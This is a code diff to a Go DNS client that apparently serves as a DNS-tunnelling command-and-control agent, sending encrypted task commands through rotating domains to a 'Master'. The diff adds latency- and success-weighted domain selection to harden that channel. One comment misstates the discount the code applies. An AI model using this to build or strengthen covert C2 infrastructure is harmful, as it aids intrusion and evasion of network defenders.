@@ -17,9 +17,11 @@ import (
 type DNSClient struct {
 	config        *Config
 	aesKey        []byte
-	lastDomain    string               // Last domain used (to avoid consecutive repeats)
-	domainIndex   int                  // For round-robin selection
-	failedDomains map[string]time.Time // Tracks temporarily failed domains
+	lastDomain    string                   // Last domain used (to avoid consecutive repeats)
+	domainIndex   int                      // For round-robin selection
+	failedDomains map[string]time.Time     // Tracks temporarily failed domains
+	domainLatency map[string]time.Duration // Tracks domain response times for weighted selection
+	successCounts map[string]int           // Tracks successful queries per domain
 	mutex         sync.RWMutex
 }
 
@@ -35,6 +37,8 @@ func newDNSClient() *DNSClient {
 		lastDomain:    "",
 		domainIndex:   0,
 		failedDomains: make(map[string]time.Time),
+		domainLatency: make(map[string]time.Duration),
+		successCounts: make(map[string]int),
 	}
 }
 
@@ -126,6 +130,11 @@ func (c *DNSClient) selectDomain(taskID string) (string, error) {
 		// Failover: always use first available domain
 		selectedDomain = availableDomains[0]
 
+	case "weighted":
+		// Weighted selection based on latency and success rate
+		// Prefer faster, more reliable domains
+		selectedDomain = c.selectWeightedDomain(availableDomains)
+
 	default:
 		// Default to random
 		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(availableDomains))))
@@ -147,6 +156,68 @@ func (c *DNSClient) selectDomain(taskID string) (string, error) {
 	// necessary metadata for the Master to reassemble results from any server
 
 	return selectedDomain, nil
+}
+
+// selectWeightedDomain chooses a domain based on performance metrics
+// Prefers domains with lower latency and higher success rates
+func (c *DNSClient) selectWeightedDomain(domains []string) string {
+	if len(domains) == 1 {
+		return domains[0]
+	}
+
+	c.mutex.RLock()
+	defer c.mutex.RUnlock()
+
+	// Calculate scores for each domain (lower is better)
+	bestScore := float64(99999)
+	bestDomain := domains[0]
+
+	for _, domain := range domains {
+		score := float64(1000) // Default score for new domains
+
+		// Factor in latency (if we have data)
+		if latency, ok := c.domainLatency[domain]; ok {
+			score = float64(latency.Milliseconds())
+		}
+
+		// Factor in success rate (boost score for reliable domains)
+		if successCount, ok := c.successCounts[domain]; ok && successCount > 0 {
+			// Reduce score by 10% for every 10 successful queries (up to 50% reduction)
+			discount := float64(successCount) / 10.0
+			if discount > 0.5 {
+				discount = 0.5
+			}
+			score = score * (1.0 - discount)
+		}
+
+		if score < bestScore {
+			bestScore = score
+			bestDomain = domain
+		}
+	}
+
+	return bestDomain
+}
+
+// updateDomainMetrics updates performance tracking for a domain after a successful query
+func (c *DNSClient) updateDomainMetrics(domain string, latency time.Duration) {
+	c.mutex.Lock()
+	defer c.mutex.Unlock()
+
+	// Update latency (exponential moving average)
+	if existing, ok := c.domainLatency[domain]; ok {
+		// 80% old, 20% new
+		c.domainLatency[domain] = (existing*4 + latency) / 5
+	} else {
+		c.domainLatency[domain] = latency
+	}
+
+	// Increment success count (cap at 100 to prevent overflow)
+	if count, ok := c.successCounts[domain]; ok && count < 100 {
+		c.successCounts[domain] = count + 1
+	} else if !ok {
+		c.successCounts[domain] = 1
+	}
 }
 
 // markDomainFailed marks a domain as temporarily failed
@@ -210,6 +281,7 @@ func (c *DNSClient) sendDNSQuery(command string, taskID string) (string, error) 
 	queryName := fmt.Sprintf("%s.%s", strings.Join(labels, "."), domain)
 
 	var result string
+	queryStart := time.Now() // Track query latency
 
 	// Use standard library DNS resolution only (simplified)
 	for attempt := 0; attempt < c.config.RetryAttempts; attempt++ {
@@ -254,6 +326,12 @@ func (c *DNSClient) sendDNSQuery(command string, taskID string) (string, error) 
 			}
 			time.Sleep(backoffDelay)
 		}
+	}
+
+	// Update metrics on successful query
+	if err == nil {
+		latency := time.Since(queryStart)
+		c.updateDomainMetrics(domain, latency)
 	}
 
 	// If all retries failed, mark domain as failed and try another domain
